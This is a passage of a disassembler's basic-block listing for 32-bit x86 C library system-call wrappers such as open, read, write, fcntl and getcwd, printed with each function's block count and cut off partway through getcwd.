|
|
|
v
0xb0da590:	xor	eax, eax
0xb0da592:	jmp	0xb0da573
None
|
|
|
v
0xb0da573:	pop	ebx
0xb0da574:	pop	esi
0xb0da575:	pop	edi
0xb0da576:	ret	
None
|
|
|
v
0xb0da535:	mov	edx, dword ptr [esp + 0x1c]
0xb0da539:	mov	ecx, dword ptr [esp + 0x18]
0xb0da53d:	mov	edi, dword ptr [esp + 0x14]
0xb0da541:	mov	esi, dword ptr [esp + 0x20]
0xb0da545:	xchg	edi, ebx
0xb0da547:	mov	eax, 0x12c
0xb0da54c:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0da55c:	mov	edx, dword ptr [ebx - 0xdc]
0xb0da562:	neg	eax
0xb0da564:	mov	ecx, dword ptr gs:[0]
0xb0da56b:	mov	dword ptr [ecx + edx], eax
0xb0da56e:	mov	eax, 0xffffffff
0xb0da573:	pop	ebx
0xb0da574:	pop	esi
0xb0da575:	pop	edi
0xb0da576:	ret	
None
|
|
|
v
0xb0da520:	push	edi
0xb0da521:	push	esi
0xb0da522:	push	ebx
0xb0da523:	call	0xb1267db
None
|
|
|
v
0xb0da577:	mov	eax, dword ptr [ebx - 0xdc]
0xb0da57d:	mov	edx, dword ptr gs:[0]
0xb0da584:	mov	dword ptr [edx + eax], 0x16
0xb0da58b:	or	eax, 0xffffffff
0xb0da58e:	jmp	0xb0da573
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:umask
TOTAL BLOCKS :2
0xb0da912:	mov	ebx, edx
0xb0da914:	ret	
None
|
|
|
v
0xb0da900:	mov	edx, ebx
0xb0da902:	mov	ebx, dword ptr [esp + 4]
0xb0da906:	mov	eax, 0x3c
0xb0da90b:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:chmod
TOTAL BLOCKS :5
0xb0da920:	mov	edx, ebx
0xb0da922:	mov	ecx, dword ptr [esp + 8]
0xb0da926:	mov	ebx, dword ptr [esp + 4]
0xb0da92a:	mov	eax, 0xf
0xb0da92f:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0da936:	mov	ebx, edx
0xb0da938:	cmp	eax, 0xfffff001
0xb0da93d:	jae	0xb0da940
None
|
|
|
v
0xb0da945:	add	ecx, 0xd06bb
0xb0da94b:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0da951:	neg	eax
0xb0da953:	add	ecx, dword ptr gs:[0]
0xb0da95a:	mov	dword ptr [ecx], eax
0xb0da95c:	or	eax, 0xffffffff
0xb0da95f:	ret	
None
|
|
|
v
0xb0da940:	call	0xb1267df
None
|
|
|
v
0xb0da93f:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:mkdir
TOTAL BLOCKS :5
0xb0daa40:	mov	edx, ebx
0xb0daa42:	mov	ecx, dword ptr [esp + 8]
0xb0daa46:	mov	ebx, dword ptr [esp + 4]
0xb0daa4a:	mov	eax, 0x27
0xb0daa4f:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0daa56:	mov	ebx, edx
0xb0daa58:	cmp	eax, 0xfffff001
0xb0daa5d:	jae	0xb0daa60
None
|
|
|
v
0xb0daa65:	add	ecx, 0xd059b
0xb0daa6b:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0daa71:	neg	eax
0xb0daa73:	add	ecx, dword ptr gs:[0]
0xb0daa7a:	mov	dword ptr [ecx], eax
0xb0daa7c:	or	eax, 0xffffffff
0xb0daa7f:	ret	
None
|
|
|
v
0xb0daa60:	call	0xb1267df
None
|
|
|
v
0xb0daa5f:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:open
TOTAL BLOCKS :8
0xb0daafc:	call	0xb0f9490
None
|
|
|
v
0xb0dab2c:	ret	
None
|
|
|
v
0xb0daad0:	cmp	dword ptr gs:[0xc], 0
0xb0daad8:	jne	0xb0daafc
None
|
|
|
v
0xb0dab24:	pop	eax
0xb0dab25:	cmp	eax, 0xfffff001
0xb0dab2a:	jae	0xb0dab2d
None
|
|
|
v
0xb0dab01:	push	eax
0xb0dab02:	push	ebx
0xb0dab03:	mov	edx, dword ptr [esp + 0x14]
0xb0dab07:	mov	ecx, dword ptr [esp + 0x10]
0xb0dab0b:	mov	ebx, dword ptr [esp + 0xc]
0xb0dab0f:	mov	eax, 5
0xb0dab14:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dab1f:	call	0xb0f94f0
None
|
|
|
v
0xb0dab1c:	xchg	dword ptr [esp], eax
None
|
|
|
v
0xb0dab1b:	pop	ebx
0xb0dab1c:	xchg	dword ptr [esp], eax
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0daada
TOTAL BLOCKS :5
0xb0daaf3:	pop	ebx
0xb0daaf4:	cmp	eax, 0xfffff001
0xb0daaf9:	jae	0xb0dab2d
None
|
|
|
v
0xb0daafb:	ret	
None
|
|
|
v
0xb0dab32:	add	ecx, 0xd04ce
0xb0dab38:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0dab3e:	neg	eax
0xb0dab40:	add	ecx, dword ptr gs:[0]
0xb0dab47:	mov	dword ptr [ecx], eax
0xb0dab49:	or	eax, 0xffffffff
0xb0dab4c:	ret	
None
|
|
|
v
0xb0dab2d:	call	0xb1267df
None
|
|
|
v
0xb0daada:	push	ebx
0xb0daadb:	mov	edx, dword ptr [esp + 0x10]
0xb0daadf:	mov	ecx, dword ptr [esp + 0xc]
0xb0daae3:	mov	ebx, dword ptr [esp + 8]
0xb0daae7:	mov	eax, 5
0xb0daaec:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0daca0
TOTAL BLOCKS :5
0xb0dacd5:	pop	ebx
0xb0dacd6:	pop	esi
0xb0dacd7:	pop	edi
0xb0dacd8:	ret	
None
|
|
|
v
0xb0dacac:	add	ebx, 0xd0354
0xb0dacb2:	mov	ecx, dword ptr [esp + 0x14]
0xb0dacb6:	mov	edi, dword ptr [esp + 0x10]
0xb0dacba:	mov	esi, dword ptr [esp + 0x1c]
0xb0dacbe:	xchg	edi, ebx
0xb0dacc0:	mov	eax, 0x127
0xb0dacc5:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0daccc:	xchg	ebx, edi
0xb0dacce:	cmp	eax, 0xfffff000
0xb0dacd3:	ja	0xb0dacd9
None
|
|
|
v
0xb0dacd9:	mov	edx, dword ptr [ebx - 0xdc]
0xb0dacdf:	neg	eax
0xb0dace1:	mov	ecx, dword ptr gs:[0]
0xb0dace8:	mov	dword ptr [ecx + edx], eax
0xb0daceb:	or	eax, 0xffffffff
0xb0dacee:	jmp	0xb0dacd5
None
|
|
|
v
0xb0daca0:	push	edi
0xb0daca1:	push	esi
0xb0daca2:	push	ebx
0xb0daca3:	mov	edx, dword ptr [esp + 0x18]
0xb0daca7:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0dadf0
TOTAL BLOCKS :5
0xb0dae2c:	mov	edx, dword ptr [ebx - 0xdc]
0xb0dae32:	neg	eax
0xb0dae34:	mov	ecx, dword ptr gs:[0]
0xb0dae3b:	mov	dword ptr [ecx + edx], eax
0xb0dae3e:	or	eax, 0xffffffff
0xb0dae41:	jmp	0xb0dae28
None
|
|
|
v
0xb0dae1f:	xchg	ebx, edi
0xb0dae21:	cmp	eax, 0xfffff000
0xb0dae26:	ja	0xb0dae2c
None
|
|
|
v
0xb0dae28:	pop	ebx
0xb0dae29:	pop	esi
0xb0dae2a:	pop	edi
0xb0dae2b:	ret	
None
|
|
|
v
0xb0dadfc:	add	ebx, 0xd0204
0xb0dae02:	mov	ecx, dword ptr [esp + 0x14]
0xb0dae06:	mov	edi, dword ptr [esp + 0x10]
0xb0dae0a:	mov	esi, dword ptr [esp + 0x1c]
0xb0dae0e:	or	dh, 0x80
0xb0dae11:	xchg	edi, ebx
0xb0dae13:	mov	eax, 0x127
0xb0dae18:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dadf0:	push	edi
0xb0dadf1:	push	esi
0xb0dadf2:	push	ebx
0xb0dadf3:	mov	edx, dword ptr [esp + 0x18]
0xb0dadf7:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:read
TOTAL BLOCKS :8
0xb0dafab:	pop	ebx
0xb0dafac:	xchg	dword ptr [esp], eax
None
|
|
|
v
0xb0daf8c:	call	0xb0f9490
None
|
|
|
v
0xb0dafbc:	ret	
None
|
|
|
v
0xb0daf60:	cmp	dword ptr gs:[0xc], 0
0xb0daf68:	jne	0xb0daf8c
None
|
|
|
v
0xb0dafb4:	pop	eax
0xb0dafb5:	cmp	eax, 0xfffff001
0xb0dafba:	jae	0xb0dafbd
None
|
|
|
v
0xb0daf91:	push	eax
0xb0daf92:	push	ebx
0xb0daf93:	mov	edx, dword ptr [esp + 0x14]
0xb0daf97:	mov	ecx, dword ptr [esp + 0x10]
0xb0daf9b:	mov	ebx, dword ptr [esp + 0xc]
0xb0daf9f:	mov	eax, 3
0xb0dafa4:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dafaf:	call	0xb0f94f0
None
|
|
|
v
0xb0dafac:	xchg	dword ptr [esp], eax
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0daf6a
TOTAL BLOCKS :5
0xb0daf83:	pop	ebx
0xb0daf84:	cmp	eax, 0xfffff001
0xb0daf89:	jae	0xb0dafbd
None
|
|
|
v
0xb0daf8b:	ret	
None
|
|
|
v
0xb0dafc2:	add	ecx, 0xd003e
0xb0dafc8:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0dafce:	neg	eax
0xb0dafd0:	add	ecx, dword ptr gs:[0]
0xb0dafd7:	mov	dword ptr [ecx], eax
0xb0dafd9:	or	eax, 0xffffffff
0xb0dafdc:	ret	
None
|
|
|
v
0xb0dafbd:	call	0xb1267df
None
|
|
|
v
0xb0daf6a:	push	ebx
0xb0daf6b:	mov	edx, dword ptr [esp + 0x10]
0xb0daf6f:	mov	ecx, dword ptr [esp + 0xc]
0xb0daf73:	mov	ebx, dword ptr [esp + 8]
0xb0daf77:	mov	eax, 3
0xb0daf7c:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:write
TOTAL BLOCKS :8
0xb0db02b:	pop	ebx
0xb0db02c:	xchg	dword ptr [esp], eax
None
|
|
|
v
0xb0db00c:	call	0xb0f9490
None
|
|
|
v
0xb0db03c:	ret	
None
|
|
|
v
0xb0dafe0:	cmp	dword ptr gs:[0xc], 0
0xb0dafe8:	jne	0xb0db00c
None
|
|
|
v
0xb0db034:	pop	eax
0xb0db035:	cmp	eax, 0xfffff001
0xb0db03a:	jae	0xb0db03d
None
|
|
|
v
0xb0db011:	push	eax
0xb0db012:	push	ebx
0xb0db013:	mov	edx, dword ptr [esp + 0x14]
0xb0db017:	mov	ecx, dword ptr [esp + 0x10]
0xb0db01b:	mov	ebx, dword ptr [esp + 0xc]
0xb0db01f:	mov	eax, 4
0xb0db024:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0db02f:	call	0xb0f94f0
None
|
|
|
v
0xb0db02c:	xchg	dword ptr [esp], eax
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0dafea
TOTAL BLOCKS :5
0xb0db003:	pop	ebx
0xb0db004:	cmp	eax, 0xfffff001
0xb0db009:	jae	0xb0db03d
None
|
|
|
v
0xb0db00b:	ret	
None
|
|
|
v
0xb0db042:	add	ecx, 0xcffbe
0xb0db048:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0db04e:	neg	eax
0xb0db050:	add	ecx, dword ptr gs:[0]
0xb0db057:	mov	dword ptr [ecx], eax
0xb0db059:	or	eax, 0xffffffff
0xb0db05c:	ret	
None
|
|
|
v
0xb0db03d:	call	0xb1267df
None
|
|
|
v
0xb0dafea:	push	ebx
0xb0dafeb:	mov	edx, dword ptr [esp + 0x10]
0xb0dafef:	mov	ecx, dword ptr [esp + 0xc]
0xb0daff3:	mov	ebx, dword ptr [esp + 8]
0xb0daff7:	mov	eax, 4
0xb0daffc:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__lseek
TOTAL BLOCKS :5
0xb0db060:	push	ebx
0xb0db061:	mov	edx, dword ptr [esp + 0x10]
0xb0db065:	mov	ecx, dword ptr [esp + 0xc]
0xb0db069:	mov	ebx, dword ptr [esp + 8]
0xb0db06d:	mov	eax, 0x13
0xb0db072:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0db087:	add	ecx, 0xcff79
0xb0db08d:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0db093:	neg	eax
0xb0db095:	add	ecx, dword ptr gs:[0]
0xb0db09c:	mov	dword ptr [ecx], eax
0xb0db09e:	or	eax, 0xffffffff
0xb0db0a1:	ret	
None
|
|
|
v
0xb0db079:	pop	ebx
0xb0db07a:	cmp	eax, 0xfffff001
0xb0db07f:	jae	0xb0db082
None
|
|
|
v
0xb0db081:	ret	
None
|
|
|
v
0xb0db082:	call	0xb1267df
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:access
TOTAL BLOCKS :5
0xb0db0b0:	mov	edx, ebx
0xb0db0b2:	mov	ecx, dword ptr [esp + 8]
0xb0db0b6:	mov	ebx, dword ptr [esp + 4]
0xb0db0ba:	mov	eax, 0x21
0xb0db0bf:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0db0c6:	mov	ebx, edx
0xb0db0c8:	cmp	eax, 0xfffff001
0xb0db0cd:	jae	0xb0db0d0
None
|
|
|
v
0xb0db0d5:	add	ecx, 0xcff2b
0xb0db0db:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0db0e1:	neg	eax
0xb0db0e3:	add	ecx, dword ptr gs:[0]
0xb0db0ea:	mov	dword ptr [ecx], eax
0xb0db0ec:	or	eax, 0xffffffff
0xb0db0ef:	ret	
None
|
|
|
v
0xb0db0d0:	call	0xb1267df
None
|
|
|
v
0xb0db0cf:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__fcntl
TOTAL BLOCKS :14
0xb0db4c5:	xchg	ebx, edi
0xb0db4c7:	cmp	eax, 0xfffff000
0xb0db4cc:	ja	0xb0db51e
None
|
|
|
v
0xb0db490:	push	edi
0xb0db491:	push	esi
0xb0db492:	push	ebx
0xb0db493:	sub	esp, 0x10
0xb0db496:	call	0xb1267db
None
|
|
|
v
0xb0db4ec:	mov	edi, dword ptr [esp + 0x20]
0xb0db4f0:	mov	ecx, dword ptr [esp + 0x24]
0xb0db4f4:	mov	edx, dword ptr [esp + 0xc]
0xb0db4f8:	mov	esi, eax
0xb0db4fa:	xchg	edi, ebx
0xb0db4fc:	mov	eax, 0xdd
0xb0db501:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0db49b:	add	ebx, 0xcfb65
0xb0db4a1:	mov	edx, dword ptr [esp + 0x28]
0xb0db4a5:	mov	eax, dword ptr gs:[0xc]
0xb0db4ab:	test	eax, eax
0xb0db4ad:	jne	0xb0db4d5
None
|
|
|
v
0xb0db51e:	mov	edx, dword ptr [ebx - 0xdc]
0xb0db524:	neg	eax
0xb0db526:	mov	ecx, dword ptr gs:[0]
0xb0db52d:	mov	dword ptr [ecx + edx], eax
0xb0db530:	or	eax, 0xffffffff
0xb0db533:	jmp	0xb0db4ce
None
|
|
|
v
0xb0db508:	xchg	ebx, edi
0xb0db50a:	cmp	eax, 0xfffff000
0xb0db50f:	mov	edi, eax
0xb0db511:	ja	0xb0db535
None
|
|
|
v
0xb0db535:	mov	eax, dword ptr [ebx - 0xdc]
0xb0db53b:	neg	edi
0xb0db53d:	mov	ecx, dword ptr gs:[0]
0xb0db544:	mov	dword ptr [ecx + eax], edi
0xb0db547:	or	edi, 0xffffffff
0xb0db54a:	jmp	0xb0db513
None
|
|
|
v
0xb0db4ce:	add	esp, 0x10
0xb0db4d1:	pop	ebx
0xb0db4d2:	pop	esi
0xb0db4d3:	pop	edi
0xb0db4d4:	ret	
None
|
|
|
v
0xb0db4af:	mov	edi, dword ptr [esp + 0x20]
0xb0db4b3:	mov	ecx, dword ptr [esp + 0x24]
0xb0db4b7:	xchg	edi, ebx
0xb0db4b9:	mov	eax, 0xdd
0xb0db4be:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0db4e3:	mov	dword ptr [esp + 0xc], edx
0xb0db4e7:	call	0xb0f9490
None
|
|
|
v
0xb0db51a:	mov	eax, edi
0xb0db51c:	jmp	0xb0db4ce
None
|
|
|
v
0xb0db513:	mov	eax, esi
0xb0db515:	call	0xb0f94f0
None
|
|
|
v
0xb0db4dc:	cmp	dword ptr [esp + 0x24], 7
0xb0db4e1:	jne	0xb0db4af
None
|
|
|
v
0xb0db4d5:	cmp	dword ptr [esp + 0x24], 0xe
0xb0db4da:	je	0xb0db4e3
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__close
TOTAL BLOCKS :6
0xb0db886:	call	0xb0f9490
None
|
|
|
v
0xb0db8a9:	pop	eax
0xb0db8aa:	cmp	eax, 0xfffff001
0xb0db8af:	jae	0xb0db8b2
None
|
|
|
v
0xb0db8b1:	ret	
None
|
|
|
v
0xb0db88b:	mov	ecx, eax
0xb0db88d:	mov	edx, ebx
0xb0db88f:	mov	ebx, dword ptr [esp + 4]
0xb0db893:	mov	eax, 6
0xb0db898:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0db860:	cmp	dword ptr gs:[0xc], 0
0xb0db868:	jne	0xb0db886
None
|
|
|
v
0xb0db89f:	mov	ebx, edx
0xb0db8a1:	push	eax
0xb0db8a2:	mov	eax, ecx
0xb0db8a4:	call	0xb0f94f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0db86a
TOTAL BLOCKS :5
0xb0db885:	ret	
None
|
|
|
v
0xb0db8b2:	call	0xb1267df
None
|
|
|
v
0xb0db87c:	mov	ebx, edx
0xb0db87e:	cmp	eax, 0xfffff001
0xb0db883:	jae	0xb0db8b2
None
|
|
|
v
0xb0db8b7:	add	ecx, 0xcf749
0xb0db8bd:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0db8c3:	neg	eax
0xb0db8c5:	add	ecx, dword ptr gs:[0]
0xb0db8cc:	mov	dword ptr [ecx], eax
0xb0db8ce:	or	eax, 0xffffffff
0xb0db8d1:	ret	
None
|
|
|
v
0xb0db86a:	mov	edx, ebx
0xb0db86c:	mov	ebx, dword ptr [esp + 4]
0xb0db870:	mov	eax, 6
0xb0db875:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:dup
TOTAL BLOCKS :5
0xb0db8fc:	call	0xb1267df
None
|
|
|
v
0xb0db8fb:	ret	
None
|
|
|
v
0xb0db8e0:	mov	edx, ebx
0xb0db8e2:	mov	ebx, dword ptr [esp + 4]
0xb0db8e6:	mov	eax, 0x29
0xb0db8eb:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0db8f2:	mov	ebx, edx
0xb0db8f4:	cmp	eax, 0xfffff001
0xb0db8f9:	jae	0xb0db8fc
None
|
|
|
v
0xb0db901:	add	ecx, 0xcf6ff
0xb0db907:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0db90d:	neg	eax
0xb0db90f:	add	ecx, dword ptr gs:[0]
0xb0db916:	mov	dword ptr [ecx], eax
0xb0db918:	or	eax, 0xffffffff
0xb0db91b:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__pipe
TOTAL BLOCKS :5
0xb0db9cc:	call	0xb1267df
None
|
|
|
v
0xb0db9cb:	ret	
None
|
|
|
v
0xb0db9d1:	add	ecx, 0xcf62f
0xb0db9d7:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0db9dd:	neg	eax
0xb0db9df:	add	ecx, dword ptr gs:[0]
0xb0db9e6:	mov	dword ptr [ecx], eax
0xb0db9e8:	or	eax, 0xffffffff
0xb0db9eb:	ret	
None
|
|
|
v
0xb0db9b0:	mov	edx, ebx
0xb0db9b2:	mov	ebx, dword ptr [esp + 4]
0xb0db9b6:	mov	eax, 0x2a
0xb0db9bb:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0db9c2:	mov	ebx, edx
0xb0db9c4:	cmp	eax, 0xfffff001
0xb0db9c9:	jae	0xb0db9cc
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:chdir
TOTAL BLOCKS :5
0xb0dbafc:	call	0xb1267df
None
|
|
|
v
0xb0dbafb:	ret	
None
|
|
|
v
0xb0dbae0:	mov	edx, ebx
0xb0dbae2:	mov	ebx, dword ptr [esp + 4]
0xb0dbae6:	mov	eax, 0xc
0xb0dbaeb:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dbaf2:	mov	ebx, edx
0xb0dbaf4:	cmp	eax, 0xfffff001
0xb0dbaf9:	jae	0xb0dbafc
None
|
|
|
v
0xb0dbb01:	add	ecx, 0xcf4ff
0xb0dbb07:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0dbb0d:	neg	eax
0xb0dbb0f:	add	ecx, dword ptr gs:[0]
0xb0dbb16:	mov	dword ptr [ecx], eax
0xb0dbb18:	or	eax, 0xffffffff
0xb0dbb1b:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getcwd
TOTAL BLOCKS :126
0xb0dbbd0:	test	esi, esi
0xb0dbbd2:	mov	ecx, dword ptr [esp + 0xf4]
0xb0dbbd9:	je	0xb0dbba1
None
|
|
|
v
0xb0dc0f2:	mov	edx, dword ptr [esp + 0x44]
0xb0dc0f6:	test	edx, edx
0xb0dc0f8:	je	0xb0dc193
None
|
|
|
v
0xb0dbba1:	mov	dword ptr [esp], ecx
0xb0dbba4:	mov	dword ptr [esp + 0x20], ecx
0xb0dbba8:	call	0xb0173f0
None
|
|
|
v
0xb0dc080:	cmp	dword ptr [esp + 0xf4], 0
0xb0dc088:	jne	0xb0dbc4d
None
|
|
|
v
0xb0dbe30:	mov	eax, dword ptr [esp + 0x50]
0xb0dbe34:	mov	edi, 1
0xb0dbe39:	xor	eax, dword ptr [esp + 0x40]
0xb0dbe3d:	mov	dword ptr [esp + 0x34], eax
0xb0dbe41:	lea	esi, dword ptr [esi]
0xb0dbe48:	mov	eax, dword ptr [esp + 0x20]
0xb0dbe4c:	mov	dword ptr [eax + ebp], 0
0xb0dbe53:	mov	dword ptr [esp], esi
0xb0dbe56:	call	0xb0b1390
None
|
|
|
v
0xb0dbc11:	mov	eax, dword ptr [esp + 0x1c]
0xb0dbc15:	test	esi, esi
0xb0dbc17:	cmovne	eax, esi
0xb0dbc1a:	add	esp, 0xdc
0xb0dbc20:	pop	ebx
0xb0dbc21:	pop	esi
0xb0dbc22:	pop	edi
0xb0dbc23:	pop	ebp
0xb0dbc24:	ret	
None
|
|
|
v
0xb0dbcb0:	mov	ecx, dword ptr [esp + 0xf4]
0xb0dbcb7:	test	esi, esi
0xb0dbcb9:	sete	byte ptr [esp + 0x56]
0xb0dbcbe:	test	ecx, ecx
0xb0dbcc0:	sete	byte ptr [esp + 0x57]
0xb0dbcc5:	je	0xb0dbe98
None
|
|
|
v
0xb0dbc1a:	add	esp, 0xdc
0xb0dbc20:	pop	ebx
0xb0dbc21:	pop	esi
0xb0dbc22:	pop	edi
0xb0dbc23:	pop	ebp
0xb0dbc24:	ret	
None
|
|
|
v
0xb0dbd25:	mov	eax, dword ptr [esp + 0x70]
0xb0dbd29:	mov	dword ptr [esp + 8], edi
0xb0dbd2d:	mov	dword ptr [esp], 3
0xb0dbd34:	mov	dword ptr [esp + 0x40], eax
0xb0dbd38:	mov	eax, dword ptr [esp + 0x74]
0xb0dbd3c:	mov	dword ptr [esp + 0x2c], eax
0xb0dbd40:	mov	eax, dword ptr [esp + 0xc8]
0xb0dbd47:	mov	dword ptr [esp + 0x28], eax
0xb0dbd4b:	lea	eax, dword ptr [ebx - 0x49170]
0xb0dbd51:	mov	dword ptr [esp + 4], eax
0xb0dbd55:	call	0xb0da340
None
|
|
|
v
0xb0dbe63:	test	byte ptr [eax + 0xa], 0xfb
0xb0dbe67:	jne	0xb0dbe48
None
|
|
|
v
0xb0dbc38:	mov	eax, dword ptr [esp + 0x20]
0xb0dbc3c:	mov	eax, dword ptr [eax + ebp]
0xb0dbc3f:	cmp	eax, 0x24
0xb0dbc42:	je	0xb0dbcb0
None
|
|
|
v
0xb0dbd62:	mov	edi, dword ptr [esp + 0x70]
0xb0dbd66:	mov	dword ptr [esp + 0x60], edi
0xb0dbd6a:	mov	edi, dword ptr [esp + 0x74]
0xb0dbd6e:	mov	dword ptr [esp + 0x64], edi
0xb0dbd72:	mov	edi, dword ptr [esp + 0xc8]
0xb0dbd79:	cmp	dword ptr [esp + 0x28], edi
0xb0dbd7d:	mov	dword ptr [esp + 0x68], edi
0xb0dbd81:	je	0xb0dc1c1
None
|
|
|
v
0xb0dbb8f:	call	0xb0e3f30
None
|
|
|
v
0xb0dc287:	mov	edx, dword ptr [esp + 0x60]
0xb0dc28b:	mov	eax, dword ptr [esp + 0x64]
0xb0dc28f:	xor	edx, dword ptr [esp + 0x50]
0xb0dc293:	xor	eax, dword ptr [esp + 0x30]
0xb0dc297:	or	edx, eax
0xb0dc299:	jne	0xb0dc019
None
|
|
|
v
0xb0dc26d:	mov	dword ptr [esp + 0x44], eax
0xb0dc271:	jmp	0xb0dc210
None
|
|
|
v
0xb0dbf7e:	test	eax, eax
0xb0dbf80:	mov	edx, eax
0xb0dbf82:	je	0xb0dc2bb
None
|
|
|
v
0xb0dbe79:	mov	edx, dword ptr [esp + 0x30]
0xb0dbe7d:	xor	edx, dword ptr [esp + 0x2c]
0xb0dbe81:	or	edx, dword ptr [esp + 0x34]
0xb0dbe85:	jne	0xb0dbeb8
None
|
|
|
v
0xb0dbe5b:	test	eax, eax
0xb0dbe5d:	je	0xb0dc030
None
|
|
|
v
0xb0dbbf1:	xchg	ebx, edx
0xb0dbbf3:	cmp	eax, 0xfffff000
0xb0dbbf8:	ja	0xb0dc235
None
|
|
|
v
0xb0dbccb:	mov	eax, dword ptr [esp + 0xf4]
0xb0dbcd2:	mov	dword ptr [esp + 0x5c], 0x24
0xb0dbcda:	mov	dword ptr [esp + 0x48], eax
0xb0dbcde:	mov	eax, dword ptr [esp + 0x1c]
0xb0dbce2:	mov	dword ptr [esp + 0x44], eax
0xb0dbce6:	mov	esi, dword ptr [esp + 0x1c]
0xb0dbcea:	add	esi, dword ptr [esp + 0x48]
0xb0dbcee:	lea	eax, dword ptr [esi - 1]
0xb0dbcf1:	mov	dword ptr [esp + 0x58], eax
0xb0dbcf5:	lea	eax, dword ptr [esp + 0x70]
0xb0dbcf9:	mov	byte ptr [esi - 1], 0
0xb0dbcfd:	mov	edi, eax
0xb0dbcff:	mov	dword ptr [esp + 0x38], eax
0xb0dbd03:	mov	dword ptr [esp + 8], eax
0xb0dbd07:	lea	eax, dword ptr [ebx - 0x48a1c]
0xb0dbd0d:	mov	dword ptr [esp + 4], eax
0xb0dbd11:	mov	dword ptr [esp], 3
0xb0dbd18:	call	0xb0da340
None
|
|
|
v
0xb0dbf1e:	mov	eax, dword ptr [esp + 0x28]
0xb0dbf22:	xor	eax, dword ptr [esp + 0xc8]
0xb0dbf29:	or	eax, dword ptr [esp + 0xcc]
0xb0dbf30:	jne	0xb0dbe48
None
|
|
|
v
0xb0dc2c7:	mov	eax, dword ptr [esp + 0x20]
0xb0dc2cb:	mov	edi, 0x22
0xb0dc2d0:	mov	dword ptr [eax + ebp], 0x22
0xb0dc2d7:	jmp	0xb0dc0c8
None
|
|
|
v
0xb0dc176:	mov	dword ptr [esp + 0x24], 0xffffff9c
0xb0dc17e:	xor	edx, edx
0xb0dc180:	mov	eax, dword ptr [esp + 0x20]
0xb0dc184:	mov	edi, dword ptr [eax + ebp]
0xb0dc187:	jmp	0xb0dc0da
None
|
|
|
v
0xb0dc13e:	mov	eax, dword ptr [esp + 0x20]
0xb0dc142:	mov	eax, dword ptr [eax + ebp]
0xb0dc145:	mov	dword ptr [esp], 0x1001
0xb0dc14c:	mov	dword ptr [esp + 0x5c], eax
0xb0dc150:	call	0xb0173f0
None
|
|
|
v
0xb0dbe8f:	mov	edi, 1
0xb0dbe94:	jmp	0xb0dbe48
None
|
|
|
v
0xb0dbdcb:	mov	edi, dword ptr [esp + 0x38]
0xb0dbdcf:	mov	dword ptr [esp + 4], eax
0xb0dbdd3:	mov	dword ptr [esp], 3
0xb0dbdda:	mov	dword ptr [esp + 8], edi
0xb0dbdde:	call	0xb0da2f0
None
|
|
|
v
0xb0dc019:	mov	eax, dword ptr [esp + 0x50]
0xb0dc01d:	mov	dword ptr [esp + 0x40], eax
0xb0dc021:	mov	eax, dword ptr [esp + 0x30]
0xb0dc025:	mov	dword ptr [esp + 0x2c], eax
0xb0dc029:	jmp	0xb0dbd9b
None
|
|
|
v
0xb0dbfd6:	mov	edx, dword ptr [esp + 0x58]
0xb0dbfda:	mov	dword ptr [esp + 8], edi
0xb0dbfde:	mov	eax, dword ptr [esp + 0x6c]
0xb0dbfe2:	sub	edx, edi
